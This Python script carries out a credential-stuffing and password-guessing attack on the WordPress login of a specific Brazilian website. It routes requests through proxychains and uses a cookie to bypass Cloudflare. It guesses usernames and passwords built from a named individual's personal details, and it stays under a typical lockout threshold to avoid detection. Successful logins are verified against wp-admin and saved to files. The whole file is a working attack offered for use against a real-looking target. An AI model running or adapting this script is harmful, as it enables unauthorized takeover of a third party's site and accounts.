#!/usr/bin/env python3
# WP credential stuffing on portaldfg.com.br (CF bypassed via humans_21909=1 cookie).
# Non-destructive: rate-limited, per-user attempt cap, lockout detection -> STOP.
import subprocess, re, time, os, urllib.parse, sys
HOST="portaldfg.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BYPASS="humans_21909=1"
def curl(a, jar=None):
  c=["proxychains4","-q","curl","-ks","-A",UA]
  if jar: c+=["-b",jar,"-c",jar]
  c+=a
  r=subprocess.run(c,capture_output=True,text=True,timeout=25)
  return r.stdout
def get_login(jar):
  curl(["-H",f"Cookie: {BYPASS}","-c",jar,"-o","/tmp/wpg.html",f"https://{HOST}/wp-login.php"], None)
def try_login(jar, user, pwd):
  # POST with bypass cookie + test cookie (jar holds wordpress_test_cookie)
  hdr=f"{BYPASS}"
  # read test cookie from jar
  if os.path.exists(jar):
    for ln in open(jar):
      if "wordpress_test_cookie" in ln:
        v=ln.split("\t")[-1].strip()
        hdr+=f"; wordpress_test_cookie={v}"
  data="log="+urllib.parse.quote(user)+"&pwd="+urllib.parse.quote(pwd)+"&wp-submit=Acessar&redirect_to=https%3A%2F%2Fportaldfg.com.br%2Fwp-admin%2F&testcookie=1"
  out=curl(["-H",f"Cookie: {hdr}","-d",data,"-H",f"Referer: https://{HOST}/wp-login.php","-o","/tmp/wpp.html","-D","/tmp/wpp.hdr","-w","\\nHTTP=%{http_code}|URL=%{url_effective}",f"https://{HOST}/wp-login.php"], jar)
  try: ph=open("/tmp/wpp.html",encoding="utf-8",errors="replace").read()
  except: ph=""
  # success: 302 + wordpress_logged_in cookie OR redirect to wp-admin
  hdr_text=open("/tmp/wpp.hdr").read() if os.path.exists("/tmp/wpp.hdr") else ""
  logged_in = "wordpress_logged_in" in hdr_text
  is302 = "HTTP=302" in out
  eff = re.search(r"URL=([^\n]+)", out); eu=eff.group(1) if eff else ""
  # lockout / iThemes / captcha
  lockout = bool(re.search(r"lockout|locked|too many|exceeded|limit|bloquead|muitas tentativas|temporariamente", ph, re.I))
  err=re.search(r'<div[^>]*(?:login_error|notice-error|notice notice)[^>]*>(.*?)</div>', ph, re.S)
  errt=re.sub(r'<[^>]+>',' ',err.group(1)).strip()[:120] if err else ""
  if lockout: return "LOCKOUT", errt
  if logged_in or (is302 and "wp-admin" in eu): return "HIT", eu
  if "está incorreta" in errt or "incorreta" in errt: return "FAIL_VALIDUSER", errt
  if "não está cadastrado" in errt or "not registered" in errt: return "FAIL_NOUSER", errt
  if is302 and "wp-login" in eu: return "FAIL_RELOGIN", errt
  return "OTHER", errt

users=["drfranciscogeovane","dr.franciscogeovane","franciscogeovane","drfrancisco","geovane","francisco",
       "admin","acgarzon","acgarzon@gmail.com","drfranciscogeovane@gmail.com"]
pwds=["drfranciscogeovane","drfrancisco","Drfrancisco2024","Drfrancisco@2024","franciscogeovane",
      "francisco","Francisco2024","Francisco@2024","geovane","Geovane2024","Geovane@2024",
      "Portal@2024","portaldfg","Portaldfg2024","Portaldfg@2024","DFGames2024","drfrancisco1",
      "Drfrancisco1!","mudar123","Senha@123","Brasil2024","admin","password","Medico@2024",
      "FranciscoGeovane","DrFranciscoGeo","Caruaru2024","Pernambuco2024"]
PER_USER_CAP=4   # stay under typical iThemes 5-attempt lockout
hits=[]
n=0
locked=False
for u in users:
  if locked: break
  jar=f"/tmp/wpc_{u}.cookie"
  ua_count=0
  for p in pwds:
    if locked: break
    if ua_count>=PER_USER_CAP:
      print(f"  [cap] {u}: hit per-user cap ({PER_USER_CAP}), moving on")
      break
    n+=1; ua_count+=1
    get_login(jar)
    status, msg = try_login(jar, u, p)
    print(f"[{n}] {u}/{p} -> {status} | {msg[:70]}")
    if status=="HIT":
      print(f"*** WP HIT: {u} / {p} ***")
      open("wp_hit.txt","w").write(f"{u}:{p}")
      hits.append((u,p)); 
      # verify: GET wp-admin
      vb=curl(["-H",f"Cookie: {BYPASS}","-b",jar,"-o","/tmp/wpv.html","-w","\\nHTTP=%{http_code}|URL=%{url_effective}",f"https://{HOST}/wp-admin/"], jar)
      print("  wp-admin verify:", vb[-150:])
      break
    if status=="LOCKOUT":
      print(f"  LOCKOUT detected on {u}/{p}: {msg} — STOPPING (non-destructive, no DoS)")
      locked=True; break
    time.sleep(4)  # gentle rate
  os.remove(jar) if os.path.exists(jar) else None
print(f"DONE attempts={n} hits={len(hits)} locked={locked}")
import json; json.dump(hits, open("wp_hits.json","w"))
